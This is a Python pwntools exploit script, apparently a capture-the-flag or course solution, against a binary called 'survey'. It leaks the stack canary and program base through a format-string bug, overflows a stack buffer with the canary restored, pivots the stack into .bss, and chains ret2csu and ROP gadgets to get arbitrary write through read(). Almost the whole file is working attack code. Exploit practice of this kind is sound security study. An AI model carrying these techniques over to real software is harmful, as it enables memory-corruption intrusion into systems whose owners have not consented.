#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.log_level = 'debug'

elf = ELF('./survey')

# ROP Gadgets
pop_rsi_r15_ret = 0x1351  # pop rsi ; pop r15 ; ret

# Byte sequence alias
A8 = 8 * b'A'


def uROP(elf_base, addr, arg1, arg2, arg3) -> bytes:
    """
    Returns an ROP chain to call a function
    :param addr: the address of the function
    :param arg1: edi
    :param arg2: rsi
    :param arg3: rdx
    :param should_align: align the stack before returning to `addr`?
    :return: a sequence of bytes
    """
    dynamic_fini = elf_base + 0x448
    __libc_csu_init1 = elf_base + 0x1330
    __libc_csu_init2 = elf_base + 0x1346

    payload  = p64(__libc_csu_init2)    # ret2csu
    payload += A8                       # dummy (這題的 csu 比較特別)
    payload += p64(0)                   # rbx
    payload += p64(1)                   # rbp
    payload += p64(dynamic_fini)        # r12
    payload += p64(arg1)                # r13 -> edi
    payload += p64(arg2)                # r14 -> rsi
    payload += p64(arg3)                # r15 -> rdx
    payload += p64(__libc_csu_init1)    # ret -> call [r12 + rbx*8] ... -> r12 + rbx * 8 -> _fini
    payload += 7 * A8                   # padding
    payload += p64(addr)                # ret
    return payload


def main():
    '''
    1. Leak stack canary via fmt attack
    2. Return to main()'s 2nd read() again
       - main()'s 2nd read: 0x5558b3315292
       - main()'s ret_addr: 0x7f83471c1152

    rbp 可控
    0x0000000000001198 : call qword ptr [rbp + 0x48]
    '''
    # proc = remote('140.112.31.97', 30201)
    proc = elf.process()
    log.debug('You may attatch this process to gdb now.')
    raw_input()

    # Develop your exploit here
    proc.recvuntil('name : ')
    proc.send(b'A' * 25)

    # Leak stack canary (8 bytes) via fmt
    proc.recvuntil('Hello, ' + 'A' * 25)

    canary = u64(b'\x00' + proc.recv(7))
    log.info('leaked canary: {}'.format(hex(canary)))

    __libc_csu_init = u64(proc.recv(6).ljust(8, b'\x00'))
    elf_text = __libc_csu_init - (0x559b16c6b2f0 - 0x559b16c6b000)
    elf_base = elf_text - (0x5593bb105000 - 0x5593bb104000)
    elf_bss = elf_text + (0x561846a350f8 - 0x561846a32000)
    log.info('leaked __libc_csu_init: {}'.format(hex(__libc_csu_init)))
    log.info('leaked ELF text: {}'.format(hex(elf_text)))
    log.info('leaded ELF bss:  {}'.format(hex(elf_bss)))

    main_2nd_read = elf_text + (0x55576e52d292  - 0x55576e52d000)
    elf_main = main_2nd_read - (0x1292 - 0x1235)
    log.info('leaked main()\'s 2nd read(): {}'.format(hex(main_2nd_read)))
    log.info('leaded main(): {}'.format(hex(elf_main)))

    # Write to the same stack buf again and overflow it,
    # but this time with the leaked canary
    proc.recvuntil('here : ')
    payload  = A8 * 3                # padding
    payload += p64(canary)           # canary
    payload += p64(elf_bss + 0x800)  # saved rbp (go to this empty place to bypass canary later)
    payload += p64(elf_main)         # ret addr
    proc.send(payload)

    # Return to main() again.
    # Note: avoid returning to somewhere before prctl() due to seccomp.
    proc.recvuntil('name : ')
    payload  = A8 * 3
    payload += p64(canary)
    payload += p64(elf_bss + 0x800 + 8 + 0x20)
    payload += p64(elf_main)
    proc.send(payload)
    proc.recvuntil('here : ')
    proc.sendline()


    # Prepare for multiple read()
    __libc_csu_init1 = elf_base + 0x1330
    __libc_csu_init2 = elf_base + 0x1346
    bss_fini_ptr = elf_bss + 0x800 + 8 + 48

    # main() again...
    # This time we can write ROP chain (only 48 bytes)
    # read() will return to our ROP chain instead of main()
    proc.recvuntil('name : ')
    payload  = p64(elf_base + pop_rsi_r15_ret)    # ret
    payload += p64(elf_bss + 0x800 + 8 + 48)      # rsi -----------------
    payload += p64(0)                             # rbp (dummy)         |
    payload += p64(elf_base + elf.sym['read'])    # ret                 |
    payload += p64(elf_base + pop_rsi_r15_ret)    # ret                 |
    payload += p64(elf_bss + 0x800 + 8 + 48 * 2)  # ret ----------------|-----
    proc.send(payload)                            #                     |    |
    # --------------------------------------------                      |    |
    payload  = p64(elf_base + 0x1368)             # rbp (dummy) <--------    |
    payload += p64(elf_base + elf.sym['read'])    # ret                      |
    payload += p64(elf_base + pop_rsi_r15_ret)    # ret                      |
    payload += p64(elf_bss + 0x800 + 8 + 48 * 3)  # rsi -----------------    |
    payload += p64(0)                             # rbp (dummy)         |    |
    payload += p64(elf_base + elf.sym['read'])    # ret                 |    |
    time.sleep(0.3)                               #                     |    |
    proc.send(payload)                            #                     |    |
    # --------------------------------------------                      |    |
    payload  = p64(__libc_csu_init2)              # ret2csu     <------------   
    payload += A8                                 # padding             |
    payload += p64(0)                             # rbx                 |
    payload += p64(1)                             # rbp                 |
    payload += p64(0)                             # r12 -> edi          |
    payload += p64(elf_bss + 0x800 + 8 + 48 * 4)  # r13 -> rsi          |
    time.sleep(0.3)                               #                     |
    proc.send(payload)                            #                     |
    # --------------------------------------------                      |
    payload  = p64(0x100)                         # r14 -> rdx  <-------
    payload += p64(bss_fini_ptr)                  # r15
    payload += p64(__libc_csu_init1)              # ret -> call [r15 + rbx*8] ... -> r15 + rbx * 8 -> _fini
    payload += 7 * A8                             # padding
    payload += p64(elf_base + elf.sym['read'])    # ret
    payload += A8                                 # ret
    time.sleep(0.3)
    proc.send(payload)

    # At this point, we should be able to perform
    # arbitrary write via read(). ^____^

    #payload += p64(elf_bss + 0x800 + 8 + 0x20 + 8 + 0x20 + 8)
    #proc.recvuntil('here : ')
    #proc.sendline()


    #payload += uROP(elf_base, elf_base + elf.sym['read'], 0, elf_base + elf.got['read'], 1)

    proc.interactive()


if __name__ == '__main__':
    main()
